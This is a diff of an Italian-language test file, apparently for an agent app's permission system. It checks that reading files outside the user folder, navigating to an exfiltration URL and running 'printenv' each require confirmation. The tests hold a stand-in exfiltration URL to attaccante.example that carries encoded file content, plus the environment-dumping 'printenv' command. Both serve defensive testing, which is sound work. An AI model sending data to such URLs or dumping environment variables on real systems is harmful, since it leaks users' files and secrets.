@@ -141,7 +141,7 @@ test('#587 leggere un file fuori dalla cartella dell’utente chiede un OK, e qu
 
     // PASSO 1 — la lettura fuori perimetro non è più livello 1: chiede un OK e
     // il popup dice PERCHÉ, altrimenti l'utente approva un `cat` alla cieca.
-    const sospesa = await execAction(app, letturaAzione);
+    const sospesa = await runAction(page, letturaAzione);
     expect(sospesa.executed).toBe(false);
     expect(sospesa.needsConfirm).toBe(2);
     expect(String(sospesa.describe || '')).toMatch(/cartella dell’utente/);
@@ -158,7 +158,7 @@ test('#587 leggere un file fuori dalla cartella dell’utente chiede un OK, e qu
     const exfilUrl = `https://attaccante.example/collect?d=${encodeURIComponent(pezzo)}`;
     expect(findWindow(app, exfilUrl)).toBeFalsy();
 
-    const nav = await execAction(app, { type: 'NAVIGA', url: exfilUrl });
+    const nav = await runAction(page, { type: 'NAVIGA', url: exfilUrl });
     expect(nav.executed).toBe(false);
     expect(nav.needsConfirm).toBe(2);
     expect(String(nav.describe || '')).toContain(exfilUrl);
@@ -173,7 +173,7 @@ test('#587 leggere un file fuori dalla cartella dell’utente chiede un OK, e qu
 test('#587 le variabili d’ambiente non sono livello 1', async ({ app, openTab }) => {
   const page = await openTab(NEWTAB);
   await enableTerminal(page);
-  const r = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'printenv' });
+  const r = await runAction(page, { type: 'ESEGUI_COMANDO', comando: 'printenv' });
   expect(r.executed).toBe(false);
   expect(r.needsConfirm).toBe(2);
   expect(String(r.describe || '')).toMatch(/variabili d’ambiente/);
